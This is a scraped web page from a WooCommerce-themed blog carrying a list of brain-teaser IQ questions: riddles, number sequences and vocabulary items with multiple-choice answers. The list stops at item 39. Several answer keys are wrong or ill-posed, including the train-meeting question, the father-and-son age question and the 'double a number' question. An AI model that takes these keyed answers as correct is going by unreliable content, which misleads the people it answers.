<body class="wp-singular post-template-default single single-post postid-58232 single-format-standard wp-theme-Newspaper theme-Newspaper td-standard-pack woocommerce-no-js td-woo-variation-switches brain-teaser-iq-questions-and-answers global-block-template-1 white-menu elementor-default elementor-kit-29778 td-boxed-layout" itemscope="itemscope" itemtype="https://schema.org/WebPage">

<div  class="td-scroll-up" data-style="style1"><i class="td-icon-menu-up"></i></div>
    <div  class="td-menu-background" style="visibility:hidden"></div>
<div  id="td-mobile-nav" style="visibility:hidden">
    <div  class="td-mobile-container">
        <!-- mobile menu top section -->
        <div  class="td-menu-socials-wrap">
            <!-- socials -->
            <div class="td-menu-socials">
                
        <span class="td-social-icon-wrap">
            <a target="_blank" href="https://www.facebook.com/learnwoo/" title="Facebook">
                <i class="td-icon-font td-icon-facebook"></i>
                <span style="display: none">Facebook</span>
            </a>
        </span>
        <span class="td-social-icon-wrap">
            <a target="_blank" href="https://twitter.com/learnwoo_com" title="Twitter">
                <i class="td-icon-font td-icon-twitter"></i>
                <span style="display: none">Twitter</span>
            </a>
        </span>
        <span class="td-social-icon-wrap">
            <a target="_blank" href="https://www.youtube.com/c/LearnWoo?sub_confirmation=1" title="Youtube">
                <i class="td-icon-font td-icon-youtube"></i>
                <span style="display: none">Youtube</span>
            </a>
        </span>            </div>
            <!-- close button -->
            <div class="td-mobile-close">
                <span><i class="td-icon-close-mobile"></i></span>
            </div>
        </div>

        <!-- login section -->
        
        <!-- menu section -->
        <div  class="td-mobile-content">
            <div class="menu-main-menu-new-container"><ul id="menu-main-menu-new" class="td-mobile-main-menu"><li id="menu-item-953" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-first menu-item-953"><a href="https://learnwoo.com/">Home</a></li>
<li id="menu-item-16017" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-16017"><a href="https://learnwoo.com/blog/">Blog<i class="td-icon-menu-right td-element-after"></i></a>
<ul class="sub-menu">
	<li id="menu-item-23778" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-23778"><a href="https://learnwoo.com/category/website-get-started/"><strong>Website &#8211; Get Started</strong></a></li>
	<li id="menu-item-23779" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-23779"><a href="https://learnwoo.com/category/ecommerce-site-get-started/"><strong>eCommerce Site &#8211; Get Started</strong></a></li>
	<li id="menu-item-38132" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-38132"><a href="https://learnwoo.com/glossary-list/">Glossary</a></li>
	<li id="menu-item-23782" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-23782"><a href="https://learnwoo.com/category/reviews/">Reviews</a></li>
	<li id="menu-item-23780" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-23780"><a href="https://learnwoo.com/category/seo-marketing/">SEO &amp; Marketing</a></li>
	<li id="menu-item-23781" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-23781"><a href="https://learnwoo.com/category/security-performance-2/">Security &amp; Performance</a></li>
	<li id="menu-item-23783" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-23783"><a href="https://learnwoo.com/category/themes/">Themes</a></li>
	<li id="menu-item-23784" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-23784"><a href="https://learnwoo.com/category/hosting/">Hosting</a></li>
	<li id="menu-item-23791" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-23791"><a href="https://learnwoo.com/category/wordpress/">WordPress</a></li>
	<li id="menu-item-23790" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-23790"><a href="https://learnwoo.com/category/woocommerce/">WooCommerce</a></li>
	<li id="menu-item-23788" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-23788"><a href="https://learnwoo.com/category/shopify/">Shopify</a></li>
	<li id="menu-item-23785" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-23785"><a href="https://learnwoo.com/category/magento/">Magento</a></li>
	<li id="menu-item-23789" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-23789"><a href="https://learnwoo.com/category/squarespace/">Squarespace</a></li>
	<li id="menu-item-23786" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-23786"><a href="https://learnwoo.com/category/opencart/">OpenCart</a></li>
	<li id="menu-item-23787" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-23787"><a href="https://learnwoo.com/category/prestashop/">PrestaShop</a></li>
</ul>
</li>
<li id="menu-item-6877" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6877"><a href="https://learnwoo.com/interviews/">Interviews</a></li>
<li id="menu-item-56111" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-56111"><a href="https://learnwoo.com/deals/">Deals</a></li>
<li id="menu-item-8526" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8526"><a href="https://learnwoo.com/promote/">Promote</a></li>
<li id="menu-item-24093" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-24093"><a href="https://learnwoo.com/shop/"><h6 style="background-color: #17c200; color:white; padding: 5px; border-radius: 5px; font-size: 14px;"></span>Shop</h6><i class="td-icon-menu-right td-element-after"></i></a>
<ul class="sub-menu">
	<li id="menu-item-24617" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-24617"><a href="https://learnwoo.com/shop/">All Products</a></li>
	<li id="menu-item-24614" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-24614"><a href="https://learnwoo.com/my-account/">My Account</a></li>
	<li id="menu-item-24616" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-24616"><a href="https://learnwoo.com/cart/">Cart</a></li>
	<li id="menu-item-24615" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-24615"><a href="https://learnwoo.com/checkout/">Checkout</a></li>
</ul>
</li>
</ul></div>        </div>
    </div>

    <!-- register/login section -->
    </div><div  class="td-search-background" style="visibility:hidden"></div>
<div  class="td-search-wrap-mob" style="visibility:hidden">
	<div  class="td-drop-down-search">
		<form method="get" class="td-search-form" action="https://learnwoo.com/">
			<!-- close button -->
			<div class="td-search-close">
				<span><i class="td-icon-close-mobile"></i></span>
			</div>
			<div role="search" class="td-search-input">
				<span>Search</span>
				<input id="td-header-search-mob" type="text" value="" name="s" autocomplete="off" />
			</div>
		</form>
		<div  id="td-aj-search-mob" class="td-ajax-search-flex"></div>
	</div>
</div>

    <div  id="td-outer-wrap" class="td-theme-wrap">
    
        
            <div  class="tdc-header-wrap ">

            <!--
Header style 7
-->


<div  class="td-header-wrap td-header-style-7 ">
    
    
    <div class="td-header-menu-wrap-full td-container-wrap ">
        
        <div class="td-header-menu-wrap td-header-gradient ">
            <div class="td-container td-header-row td-header-main-menu">
                <div class="td-header-sp-logo">
                                <a class="td-main-logo" href="https://learnwoo.com/">
                <img src="https://cdn.learnwoo.com/wp-content/uploads/2018/05/Learnwoo_Logo-design_90-300x67.png" alt="LearnWoo Logo - Explore WooCommerce & Wordpress"  width="" height=""/>
                <span class="td-visual-hidden">LearnWoo</span>
            </a>
                        </div>
                    
    <div class="header-search-wrap">
        <div class="td-search-btns-wrap">
            <a id="td-header-search-button" href="#" role="button" aria-label="Search" class="dropdown-toggle " data-toggle="dropdown"><i class="td-icon-search"></i></a>
                        <a id="td-header-search-button-mob" href="#" aria-label="Search" class="dropdown-toggle " data-toggle="dropdown"><i class="td-icon-search"></i></a>
                    </div>

        <div class="td-drop-down-search" aria-labelledby="td-header-search-button">
            <form method="get" class="td-search-form" action="https://learnwoo.com/">
                <div role="search" class="td-head-form-search-wrap">
                    <input id="td-header-search" type="text" value="" name="s" autocomplete="off" /><input class="wpb_button wpb_btn-inverse btn" type="submit" id="td-header-search-top" value="Search" />
                </div>
            </form>
            <div id="td-aj-search"></div>
        </div>
    </div>

<div id="td-header-menu" role="navigation">
        <div id="td-top-mobile-toggle"><a href="#" role="button" aria-label="Menu"><i class="td-icon-font td-icon-mobile"></i></a></div>
        <div class="td-main-menu-logo td-logo-in-header">
                <a class="td-main-logo" href="https://learnwoo.com/">
            <img src="https://cdn.learnwoo.com/wp-content/uploads/2018/05/Learnwoo_Logo-design_90-300x67.png" alt="LearnWoo Logo - Explore WooCommerce & Wordpress"  width="" height=""/>
        </a>
        </div>
    <div class="menu-main-menu-new-container"><ul id="menu-main-menu-new-1" class="sf-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-first td-menu-item td-normal-menu menu-item-953"><a href="https://learnwoo.com/">Home</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children td-menu-item td-normal-menu menu-item-16017"><a href="https://learnwoo.com/blog/">Blog</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-23778"><a href="https://learnwoo.com/category/website-get-started/"><strong>Website &#8211; Get Started</strong></a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-23779"><a href="https://learnwoo.com/category/ecommerce-site-get-started/"><strong>eCommerce Site &#8211; Get Started</strong></a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-38132"><a href="https://learnwoo.com/glossary-list/">Glossary</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-23782"><a href="https://learnwoo.com/category/reviews/">Reviews</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-23780"><a href="https://learnwoo.com/category/seo-marketing/">SEO &amp; Marketing</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-23781"><a href="https://learnwoo.com/category/security-performance-2/">Security &amp; Performance</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-23783"><a href="https://learnwoo.com/category/themes/">Themes</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-23784"><a href="https://learnwoo.com/category/hosting/">Hosting</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-23791"><a href="https://learnwoo.com/category/wordpress/">WordPress</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-23790"><a href="https://learnwoo.com/category/woocommerce/">WooCommerce</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-23788"><a href="https://learnwoo.com/category/shopify/">Shopify</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-23785"><a href="https://learnwoo.com/category/magento/">Magento</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-23789"><a href="https://learnwoo.com/category/squarespace/">Squarespace</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-23786"><a href="https://learnwoo.com/category/opencart/">OpenCart</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-23787"><a href="https://learnwoo.com/category/prestashop/">PrestaShop</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-6877"><a href="https://learnwoo.com/interviews/">Interviews</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-56111"><a href="https://learnwoo.com/deals/">Deals</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-8526"><a href="https://learnwoo.com/promote/">Promote</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children td-menu-item td-normal-menu menu-item-24093"><a href="https://learnwoo.com/shop/"><h6 style="background-color: #17c200; color:white; padding: 5px; border-radius: 5px; font-size: 14px;"></span>Shop</h6></a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-24617"><a href="https://learnwoo.com/shop/">All Products</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-24614"><a href="https://learnwoo.com/my-account/">My Account</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-24616"><a href="https://learnwoo.com/cart/">Cart</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-24615"><a href="https://learnwoo.com/checkout/">Checkout</a></li>
</ul>
</li>
</ul></div></div>

            </div>
        </div>
    </div>

    
</div>
            </div>

            
    <div  class="td-main-content-wrap td-container-wrap">

        <div  class="td-container td-post-template-default ">
            <div class="td-crumb-container"></div>

            <div class="td-pb-row">
                                        <div class="td-pb-span8 td-main-content" role="main">
                            <div class="td-ss-main-content">
                                
    <article id="post-58232" class="post-58232 post type-post status-publish format-standard has-post-thumbnail category-blog category-guide category-iq category-iq-questions category-logical-reasoning tag-blog tag-brain-teasers tag-iq tag-iq-test tag-mcq" itemscope itemtype="https://schema.org/Article">
        <div class="td-post-header">

            <!-- category --><ul class="td-category"><li class="entry-category"><a  href="https://learnwoo.com/category/blog/">Blog</a></li><li class="entry-category"><a  href="https://learnwoo.com/category/guide/">Guide</a></li><li class="entry-category"><a  href="https://learnwoo.com/category/iq/">IQ</a></li><li class="entry-category"><a  href="https://learnwoo.com/category/iq-questions/">IQ questions</a></li><li class="entry-category"><a  href="https://learnwoo.com/category/logical-reasoning/">Logical Reasoning</a></li></ul>
            <header class="td-post-title">
                <h1 class="entry-title">100+ Brain Teaser IQ Questions and Answers</h1>
                

                <div class="td-module-meta-info">
                    <!-- author --><div class="td-post-author-name td-post-author-no-dot"><div class="td-author-by">By</div> <a href="https://learnwoo.com/author/aswathyajaykumar/">Aswathy Ajaykumar</a><div class="td-author-line"> - </div> </div>                    <!-- date -->                    <!-- comments -->                    <!-- views -->                </div>

            </header>

        </div>

        <div class="td-post-sharing-top"><div id="td_social_sharing_article_top" class="td-post-sharing td-ps-bg td-ps-notext td-post-sharing-style1 ">
		<style></style>

		<div class="td-post-sharing-visible"><a class="td-social-sharing-button td-social-sharing-button-js td-social-network td-social-facebook" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Flearnwoo.com%2Fbrain-teaser-iq-questions-and-answers%2F" title="Facebook" ><div class="td-social-but-icon"><i class="td-icon-facebook"></i></div><div class="td-social-but-text">Facebook</div></a><a class="td-social-sharing-button td-social-sharing-button-js td-social-network td-social-twitter" href="https://twitter.com/intent/tweet?text=100%2B+Brain+Teaser+IQ+Questions+and+Answers&url=https%3A%2F%2Flearnwoo.com%2Fbrain-teaser-iq-questions-and-answers%2F&via=learnwoo_com" title="Twitter" ><div class="td-social-but-icon"><i class="td-icon-twitter"></i></div><div class="td-social-but-text">Twitter</div></a><a class="td-social-sharing-button td-social-sharing-button-js td-social-network td-social-pinterest" href="https://pinterest.com/pin/create/button/?url=https://learnwoo.com/brain-teaser-iq-questions-and-answers/&amp;media=https://learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser.png&description=100%2B+Brain+Teaser+IQ+Questions+and+Answers" title="Pinterest" ><div class="td-social-but-icon"><i class="td-icon-pinterest"></i></div><div class="td-social-but-text">Pinterest</div></a><a class="td-social-sharing-button td-social-sharing-button-js td-social-network td-social-whatsapp" href="https://api.whatsapp.com/send?text=100%2B+Brain+Teaser+IQ+Questions+and+Answers %0A%0A https://learnwoo.com/brain-teaser-iq-questions-and-answers/" title="WhatsApp" ><div class="td-social-but-icon"><i class="td-icon-whatsapp"></i></div><div class="td-social-but-text">WhatsApp</div></a></div><div class="td-social-sharing-hidden"><ul class="td-pulldown-filter-list"></ul><a class="td-social-sharing-button td-social-handler td-social-expand-tabs" href="#" data-block-uid="td_social_sharing_article_top" title="More">
                                    <div class="td-social-but-icon"><i class="td-icon-plus td-social-expand-tabs-icon"></i></div>
                                </a></div></div></div>
        <div class="td-post-content tagdiv-type">
            <!-- image --><div class="td-post-featured-image"><a href="https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser.png" data-caption=""><img fetchpriority="high" width="696" height="392" class="entry-thumb td-modal-image" src="https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser-696x392.png" srcset="https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser-696x392.png 696w, https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser-300x169.png 300w, https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser-1024x576.png 1024w, https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser-768x432.png 768w, https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser-1068x601.png 1068w, https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser-747x420.png 747w, https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser-600x338.png 600w, https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser.png 1120w" sizes="(max-width: 696px) 100vw, 696px" alt="Brain teaser IQ Questions" title="100+ Brain Teaser"/></a></div>
            <!-- content -->
<p>Brain teaser IQ questions are a mix of puzzles and questions that require mental effort to solve. Brain teasers refresh the mind, preparing it to grasp new information effectively. Sharpening your critical skills can help in memory retention, quicker pace in solving problems, etc.</p>



<div id="ez-toc-container" class="ez-toc-v2_0_75 counter-hierarchy ez-toc-counter ez-toc-grey ez-toc-container-direction">
<div class="ez-toc-title-container">
<p class="ez-toc-title" style="cursor:inherit">Table of Contents</p>
<span class="ez-toc-title-toggle"><a href="#" class="ez-toc-pull-right ez-toc-btn ez-toc-btn-xs ez-toc-btn-default ez-toc-toggle" aria-label="Toggle Table of Content"><span class="ez-toc-js-icon-con"><span class=""><span class="eztoc-hide" style="display:none;">Toggle</span><span class="ez-toc-icon-toggle-span"><svg style="fill: #999;color:#999" xmlns="http://www.w3.org/2000/svg" class="list-377408" width="20px" height="20px" viewBox="0 0 24 24" fill="none"><path d="M6 6H4v2h2V6zm14 0H8v2h12V6zM4 11h2v2H4v-2zm16 0H8v2h12v-2zM4 16h2v2H4v-2zm16 0H8v2h12v-2z" fill="currentColor"></path></svg><svg style="fill: #999;color:#999" class="arrow-unsorted-368013" xmlns="http://www.w3.org/2000/svg" width="10px" height="10px" viewBox="0 0 24 24" version="1.2" baseProfile="tiny"><path d="M18.2 9.3l-6.2-6.3-6.2 6.3c-.2.2-.3.4-.3.7s.1.5.3.7c.2.2.4.3.7.3h11c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.7s-.1-.5-.3-.7zM5.8 14.7l6.2 6.3 6.2-6.3c.2-.2.3-.5.3-.7s-.1-.5-.3-.7c-.2-.2-.4-.3-.7-.3h-11c-.3 0-.5.1-.7.3-.2.2-.3.5-.3.7s.1.5.3.7z"/></svg></span></span></span></a></span></div>
<nav><ul class='ez-toc-list ez-toc-list-level-1 ' ><li class='ez-toc-page-1 ez-toc-heading-level-2'><a class="ez-toc-link ez-toc-heading-1" href="#What_are_the_Benefits_of_Brain_Teaser_IQ_Questions" >What are the Benefits of Brain Teaser IQ Questions?</a></li><li class='ez-toc-page-1 ez-toc-heading-level-2'><a class="ez-toc-link ez-toc-heading-2" href="#100_Mixed_Brain_Teaser_IQ_Questions" >100 + Mixed Brain Teaser IQ Questions</a></li><li class='ez-toc-page-1 ez-toc-heading-level-2'><a class="ez-toc-link ez-toc-heading-3" href="#Summary" >Summary</a><ul class='ez-toc-list-level-3' ><li class='ez-toc-heading-level-3'><a class="ez-toc-link ez-toc-heading-4" href="#FAQs" >FAQs</a></li><li class='ez-toc-page-1 ez-toc-heading-level-3'><a class="ez-toc-link ez-toc-heading-5" href="#Further_Reading" >Further Reading</a></li></ul></li></ul></nav></div>
<h2 class="wp-block-heading"><span class="ez-toc-section" id="What_are_the_Benefits_of_Brain_Teaser_IQ_Questions"></span>What are the Benefits of Brain Teaser IQ Questions?<span class="ez-toc-section-end"></span></h2>



<p>Brain teaser <a href="https://learnwoo.com/best-iq-test-questions-with-answers/">IQ questions</a> offer numerous benefits. They are:</p>



<ul class="wp-block-list">
<li>Enhance Cognitive Ability</li>



<li>Train the minds to think quick</li>



<li>Builds Troubleshooting Skills</li>



<li>Helps the brain relax</li>
</ul>



<p>You can further understand <a href="https://www.123test.com/interpretation-of-an-iq-score/" target="_blank" rel="noopener">how to interpret IQ stores</a> to make sure you are on the right track.</p>



<p>Now, let&#8217;s tackle those questions.</p>



<h2 class="wp-block-heading"><span class="ez-toc-section" id="100_Mixed_Brain_Teaser_IQ_Questions"></span>100 + Mixed Brain Teaser IQ Questions<span class="ez-toc-section-end"></span></h2>



<ol class="wp-block-list">
<li>A snail climbs 3 feet during the day but slips 2 feet at night. How many days will it take to climb a 30-foot wall?</li>
</ol>



<p>Options:</p>



<p>a) 30 days<br>b) 28 days<br>c) 31 days<br>d) 20 days</p>



<pre class="wp-block-preformatted">Answer: 28 days</pre>



<ol class="wp-block-list" start="2">
<li>A clock strikes once at 1:00, twice at 2:00, and so on. How many times does it strike in a day?</li>
</ol>



<p>Options:</p>



<p>a) 150 times<br>b) 200 times<br>c) 156 times<br>d) 160 times</p>



<pre class="wp-block-preformatted">Answer: 156 times</pre>



<ol class="wp-block-list" start="3">
<li>What’s the 10th number in the Fibonacci sequence?</li>
</ol>



<p>Options:</p>



<p>a) 34<br>b) 55<br>c) 30<br>d) 15</p>



<pre class="wp-block-preformatted">Answer: 34</pre>



<ol class="wp-block-list" start="4">
<li>What comes next: 1, 4, 9, 16, 25, __?</li>
</ol>



<p>Options:</p>



<p>a) 36<br>b) 144<br>c) 20<br>d) 30</p>



<pre class="wp-block-preformatted">Answer: 36</pre>



<ol class="wp-block-list" start="5">
<li>A man builds a house with all four sides facing south. What color is the bear nearby?</li>
</ol>



<p>Options:</p>



<p>a) Black<br>b) White<br>c) Orange<br>d) Blue</p>



<pre class="wp-block-preformatted">Answer: White</pre>



<ol class="wp-block-list" start="6">
<li>A person who loves mankind</li>
</ol>



<p>Options:</p>



<p>a) Philanthropist<br>b) Misogynist<br>c) Egoist<br>d) Narcissist</p>



<pre class="wp-block-preformatted">Answer: Philanthropist</pre>



<ol class="wp-block-list" start="7">
<li>Identify the missing number: 2, 3, 5, 8, 12, __.</li>
</ol>



<p>Options:</p>



<p>a) 0<br>b) 10<br>c) 17<br>d) 12</p>



<pre class="wp-block-preformatted">Answer: 17</pre>



<ol class="wp-block-list" start="8">
<li>Rearrange the letters in “NEW DOOR” to make one word.</li>
</ol>



<p>Options:</p>



<p>a) Wonder<br>b) Won<br>c) Done<br>d) One word</p>



<pre class="wp-block-preformatted">Answer: One Word</pre>



<ol class="wp-block-list" start="9">
<li>A rooster lays an egg on a slanted barn roof. Which way does it roll?</li>
</ol>



<pre class="wp-block-preformatted">It doesn't roll through either of the way. A rooster doesn't lay eggs.</pre>



<ol class="wp-block-list" start="10">
<li>The study of human societies and cultures</li>
</ol>



<p>Options:</p>



<p>a) Archaeology<br>b) Anthropology<br>c) Sociology<br>d) Psychology</p>



<pre class="wp-block-preformatted">Answer: Anthropology</pre>



<ol class="wp-block-list" start="11">
<li>3, 6, 11, 18, __?</li>
</ol>



<p>Options:</p>



<p>a) 19<br>b) 27<br>c) 10<br>d) 20</p>



<pre class="wp-block-preformatted">Answer: 27</pre>



<ol class="wp-block-list" start="12">
<li>A train leaves the station at 1 PM traveling at 60 mph. Another train leaves at 2 PM traveling at 80 mph. At what time will they meet?</li>
</ol>



<p>Options:</p>



<p>a) 3:00 PM<br>b) 2:00 PM<br>c) 12:00 PM<br>d) 1:00 AM</p>



<pre class="wp-block-preformatted">Answer: 3:00 PM</pre>



<ol class="wp-block-list" start="13">
<li>What five-letter word becomes shorter when you add two letters to it?</li>
</ol>



<pre class="wp-block-preformatted">Answer: Shorter</pre>



<ol class="wp-block-list" start="14">
<li>What letter comes next: A, C, F, J, __?</li>
</ol>



<p>Options:</p>



<p>a) P<br>b) O<br>c) K<br>d) L</p>



<pre class="wp-block-preformatted">Answer: O</pre>



<ol class="wp-block-list" start="15">
<li>A government by the wealthy</li>
</ol>



<p>Options:</p>



<p>a) Aristocracy<br>b) Monarchy<br>c) Plutocracy<br>d) Oligarchy</p>



<pre class="wp-block-preformatted">Answer: Plutocracy</pre>



<ol class="wp-block-list" start="16">
<li>Find the antonym of the following word from options.</li>
</ol>



<p>RELINQUISH</p>



<p>Options:</p>



<p>a) Possess<br>b) Deny<br>c) Abscond<br>d) Abdicate</p>



<pre class="wp-block-preformatted">Answer: Possess</pre>



<ol class="wp-block-list" start="17">
<li>Two fathers and two sons catch three fish. Each person gets one. How?</li>
</ol>



<pre class="wp-block-preformatted">Answer: They are Grandfather, Son and Grand Son.</pre>



<ol class="wp-block-list" start="18">
<li>If a plane crashes on the border of two countries, where are the survivors buried?</li>
</ol>



<pre class="wp-block-preformatted">Answer: Survivors won't be buried.</pre>



<ol class="wp-block-list" start="19">
<li>Spot the odd one out: 2, 4, 8, 32, 64.</li>
</ol>



<p>Options:</p>



<p>a) 4<br>b) 2<br>c) 32<br>d) 64</p>



<pre class="wp-block-preformatted">Answer: 32</pre>



<ol class="wp-block-list" start="20">
<li>10, 20, 15, 25, __?</li>
</ol>



<p>Options:</p>



<p>a) 30<br>b) 15<br>c) 20<br>d) 10</p>



<pre class="wp-block-preformatted">Answer: 20</pre>



<ol class="wp-block-list" start="21">
<li>The sum of three consecutive integers is 90. What are the integers?</li>
</ol>



<pre class="wp-block-preformatted">Answer: 29,30, and 31.</pre>



<ol class="wp-block-list" start="22">
<li>Find the antonym for the following word.</li>
</ol>



<p>FRAUDULENT</p>



<p>Options:</p>



<p>a) Fraud<br>b) Genuine<br>c) Real<br>d) Non-fraud</p>



<pre class="wp-block-preformatted">Answer: Genuine</pre>



<ol class="wp-block-list" start="23">
<li>What comes next in the series: 3, 8, 18, 34, 66, __?</li>
</ol>



<p>Options:</p>



<p>a) 150<br>b) 130<br>c) 132<br>d) 122</p>



<pre class="wp-block-preformatted">Answer: 130</pre>



<ol class="wp-block-list" start="24">
<li>What comes next in the series: 12, 21, 32, 23, 34, __?</li>
</ol>



<p>Options:</p>



<p>a) 36<br>b) 38<br>c) 43<br>d) 40</p>



<pre class="wp-block-preformatted">Answer: 43</pre>



<ol class="wp-block-list" start="25">
<li>A person who eats too much</li>
</ol>



<p>a) Obese<br>b) Glutton<br>c) Poverty<br>d) Epicure</p>



<pre class="wp-block-preformatted">Answer: Glutton</pre>



<ol class="wp-block-list" start="26">
<li>The man who invented it doesn’t want it, the man who bought it doesn’t need it, and the man who uses it doesn’t know it. What is it?</li>
</ol>



<pre class="wp-block-preformatted">Answer: Coffin</pre>



<ol class="wp-block-list" start="27">
<li>If a snail moves 3 cm in one minute and then rests for 2 minutes, how far will it go in 15 minutes?</li>
</ol>



<p>Options:</p>



<p>a) 12cm<br>b) 10cm<br>c) 15cm<br>d) 20cm</p>



<pre class="wp-block-preformatted">Answer: 15cm</pre>



<ol class="wp-block-list" start="28">
<li>A man is 30 years old and his son is 5. How many years ago was the man six times as old as his son?</li>
</ol>



<p>Options:</p>



<p>a) 10 years<br>b) 15 years<br>c) 8 years<br>d) 5 years</p>



<pre class="wp-block-preformatted">Answer: 10 years</pre>



<ol class="wp-block-list" start="29">
<li>Find the synonym of the following word:</li>
</ol>



<p>LAMENT</p>



<p>Options:</p>



<p>a) Complain<br>b) Opinion<br>c) Cry<br>d) Condone</p>



<pre class="wp-block-preformatted">Answer: Complain</pre>



<ol class="wp-block-list" start="30">
<li>A farmer has 17 sheep. All but 9 run away. How many are left?</li>
</ol>



<p>Options:</p>



<p>a) 17<br>b) 0<br>c) 9<br>d) 2</p>



<pre class="wp-block-preformatted">Answer: 9</pre>



<ol class="wp-block-list" start="31">
<li>Double a number, add 10, then divide by 2, and subtract 5. You get the same number. What is it?</li>
</ol>



<p>Options:</p>



<p>a) 10<br>b) 5<br>c) 2<br>d) 4</p>



<pre class="wp-block-preformatted">Answer: 5</pre>



<ol class="wp-block-list" start="32">
<li>What comes next: A2, C4, E8, G16, __?</li>
</ol>



<p>Options:</p>



<p>a) 30<br>b) 32<br>c) 31<br>d) 22</p>



<pre class="wp-block-preformatted">Answer: 32</pre>



<ol class="wp-block-list" start="33">
<li>I am a three-digit number. My tens digit is five more than my ones digit, and my hundreds digit is eight less than my tens digit. What am I?</li>
</ol>



<p>Options:</p>



<p>a) 194<br>b) 283<br>c) 382<br>d) 155</p>



<pre class="wp-block-preformatted">Answer: 194</pre>



<ol class="wp-block-list" start="34">
<li>Find the synonym of the following word:</li>
</ol>



<p>RECKLESS</p>



<p>Options:</p>



<p>a) Courageous<br>b) Rash<br>c) Bold<br>d) Daring</p>



<pre class="wp-block-preformatted">Answer: Rash</pre>



<ol class="wp-block-list" start="35">
<li>What comes next: 1, 2, 6, 24, 120, __?</li>
</ol>



<p>Options:</p>



<p>a) 350<br>b) 600<br>c) 720<br>d) 140</p>



<pre class="wp-block-preformatted">Answer: 720</pre>



<ol class="wp-block-list" start="36">
<li>Complete the pattern: 2, 3, 5, 7, 11, __.</li>
</ol>



<p>Options:</p>



<p>a) 13<br>b) 15<br>c) 16<br>d) 12</p>



<pre class="wp-block-preformatted">Answer: 13</pre>



<ol class="wp-block-list" start="37">
<li>How many times can you subtract 10 from 100?</li>
</ol>



<pre class="wp-block-preformatted">Answer: One time.</pre>



<ol class="wp-block-list" start="38">
<li>I add five to nine and get two. The answer is correct, but how?</li>
</ol>



<pre class="wp-block-preformatted">Answer: It’s a clock: 9 o’clock + 5 hours = 2 o’clock.</pre>



<ol class="wp-block-list" start="39">
